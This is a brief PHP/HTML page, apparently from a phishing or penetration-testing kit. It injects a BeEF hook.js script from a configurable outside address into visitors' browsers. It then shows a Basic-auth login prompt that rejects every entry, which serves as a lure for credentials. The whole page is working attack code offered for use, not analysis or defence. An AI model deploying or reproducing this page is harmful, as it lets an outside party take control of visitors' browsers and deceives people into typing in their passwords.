<!DOCTYPE html>

<head>
<?php
if (BEEF_ENABLED){
    echo '<script type="text/javascript" src="http://' . BEEF_ADDR . '/hook.js"></script>';
}
?>
</head>

<?php

if (isset($_SESSION['counter'])){
	if($_SESSION['counter'] > 4){
		echo '<p>Failed to Authenticate: Max failed attempts reached.</p>';
	}
    else{
        if (isset($_SERVER['PHP_AUTH_USER'])) {
            $_SESSION['counter'] = ++$_SESSION['counter'];
            header('WWW-Authenticate: Basic realm="My Realm"');
            header('HTTP/1.0 401 Unauthorized');
            echo '<p>Failed to Authenticate: Incorrect.</p>';
        }
        else{
                header('WWW-Authenticate: Basic realm="My Realm"');
                header('HTTP/1.0 401 Unauthorized');
                echo '<p>Failed to Authenticate: No credentials.</p>';
        }
    }
}
else{
	$_SESSION['counter'] = 0;
    header('WWW-Authenticate: Basic realm="My Realm"');
    header('HTTP/1.0 401 Unauthorized');
    echo '<p>Failed to Authenticate: No credentials.</p>';
}

    
?>
</head>